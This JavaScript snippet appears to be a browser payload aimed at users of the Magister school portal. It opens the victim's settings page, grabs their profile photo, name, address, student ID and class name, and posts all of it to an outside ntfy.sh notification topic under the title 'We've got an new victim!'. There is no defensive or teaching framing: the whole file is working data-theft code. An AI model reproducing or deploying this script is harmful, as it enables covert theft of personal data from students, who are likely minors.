var w = window.open(`https://${location.host}/magister/#/mijn-instellingen`, "_blank");

w.addEventListener("load", () => {
  var imgSrc = w.document.querySelector("img").src
  var imgInterval = setInterval(() => {
    if (w.document.querySelector("img").src !== imgSrc) {
      fetch(w.document.querySelector("img").src)
        .then(response => response.blob())
        .then(blob => new Promise((resolve, reject) => {
          const reader = new FileReader()
          reader.onloadend = () => resolve(reader.result)
          reader.onerror = reject
          reader.readAsDataURL(blob)
        }))
        .then(data => {
          fetch("https://ntfy.sh/f4PmGSeRW33ShZTY", {
            method: "POST", 
            body: data
          })
          fetch("https://ntfy.sh/f4PmGSeRW33ShZTY", {
            method: "POST", 
            headers: {
              "Title": "We've got an new victim!",
            },
            body: `Name: ${w.document.querySelector("#naw > div > div > ul > li:nth-child(2) > span").innerHTML.toString()}\nAdress: ${w.document.querySelector("#naw > div > div > ul > li:nth-child(4) > span").innerText.toString().split("\n").join(" ")}\nStudent ID: ${w.document.querySelector("#opleiding > div > div > ul > li:nth-child(4) > span").innerHTML.toString()}\nClass name: ${w.document.querySelector("#opleiding > div > div > ul > li:nth-child(3) > span").innerHTML.toString()}`,
          })
        })
      clearInterval(imgInterval)
      w.close()
    }
  }, 250)
})
